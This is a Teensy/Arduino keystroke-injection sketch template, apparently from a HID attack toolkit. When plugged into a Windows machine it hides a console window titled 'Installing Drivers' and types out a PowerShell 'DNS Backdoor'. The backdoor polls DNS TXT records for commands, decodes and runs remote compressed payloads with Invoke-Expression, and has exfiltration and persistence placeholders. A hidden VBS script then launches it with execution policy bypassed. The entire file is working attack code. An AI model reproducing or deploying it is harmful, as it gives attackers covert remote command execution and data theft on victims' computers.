#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  DNS Backdoor\" > %temp%\\dtb.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dtb.ps1");

  String fn = "dtb";

  PERSCALLS

  delay(1000);
  Keyboard.println("echo while(1){  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $exec = 0  >> %temp%\\dtb.ps1");
  Keyboard.println("echo sleep 5  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $ANS = "INPUT11"  >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($ANS -ne $null) { >> %temp%\\dtb.ps1");
  Keyboard.println("echo $gtc = (iex \"nslookup -querytype=txt INPUT4 $ANS\")}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo else {$gtc = (iex \"nslookup -querytype=txt INPUT4\")}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $tmp = $gtc ^| Select-String -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $st = $tmp -split(^\"`^\"^\")[0] >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($st[1] -eq \"INPUT5\"){ >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($ANS -ne $null) { >> %temp%\\dtb.ps1");
  Keyboard.println("echo $gtm = (iex \"nslookup -querytype=txt INPUT6 $ANS\")}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo else {$gtm = (iex \"nslookup -querytype=txt INPUT6\")}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $temp = $gtm ^| Select-String -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $cmd = $temp -split(^\"`^\"^\")[0] >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pv = iex $cmd[1]  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $exec++ } >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($st[1] -eq \"INPUT7\"){ >> %temp%\\dtb.ps1");
  Keyboard.println("echo $i=1 >> %temp%\\dtb.ps1");
  Keyboard.println("echo while ($i -le INPUT9) { >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($ANS -ne $null) { >> %temp%\\dtb.ps1");
  Keyboard.println("echo $gtm = (iex \"nslookup -querytype=txt INPUT9.INPUT8 $ANS\")}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo else {$gtm = (iex \"nslookup -querytype=txt INPUT9.INPUT8\")}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $temp = $gtm ^| Select-String -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $tmp1 = \"\"  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $tmp1 = $tmp1 + $temp  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $edt = $tmp1 -replace '\\s+', \"\" -replace ^\"^`\"\", \"\"  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $i++}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $dec = [System.Convert]::FromBase64String($edt)  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $ms = New-Object System.IO.MemoryStream >> %temp%\\dtb.ps1");
  Keyboard.println("echo $ms.Write($dec, 0, $dec.Length) >> %temp%\\dtb.ps1");
  Keyboard.println("echo $ms.Seek(0,0) ^| Out-Null  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress) >> %temp%\\dtb.ps1");
  Keyboard.println("echo $sr = New-Object System.IO.StreamReader($cs) >> %temp%\\dtb.ps1");
  Keyboard.println("echo $cmd = $sr.readtoend() >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pre = ls function:\\ >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pv = Invoke-Expression $cmd >> %temp%\\dtb.ps1");
  Keyboard.println("echo $post = ls function:\\ >> %temp%\\dtb.ps1");
  Keyboard.println("echo $dobj = diff $pre $post >> %temp%\\dtb.ps1");
  Keyboard.println("echo $fname = $dobj.InputObject.Name >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($fname -ne $null) {$pv = Invoke-Expression $fname} >> %temp%\\dtb.ps1");
  Keyboard.println("echo $exec++ } >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($exec -eq 1){ >> %temp%\\dtb.ps1");
  String fn = "dtb";
  String fp;
  EXFILCALLS

  Keyboard.println("echo sleep 60 }  >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($st[1] -eq \"INPUT11\"){ break }} >> %temp%\\dtb.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dtb.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dtb.ps1\"),0,true >> %temp%\\dtb.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dtb.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

 DEFS
 EXFILDEFS
 PERSDEFS